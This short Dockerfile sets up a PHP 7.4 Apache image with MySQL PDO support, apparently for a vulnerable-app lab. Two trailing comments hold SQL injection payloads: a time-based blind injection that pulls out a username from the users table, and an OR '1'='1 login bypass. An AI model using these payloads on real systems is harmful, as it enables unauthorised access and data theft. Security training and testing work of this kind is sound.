FROM php:7.4-apache

# Install MySQL PDO extension
RUN docker-php-ext-install pdo pdo_mysql


# admin' AND IF(ASCII(SUBSTRING((SELECT username FROM users LIMIT 1), 1, 1)) > 100, SLEEP(5), 0) -- 
# a' OR '1'='1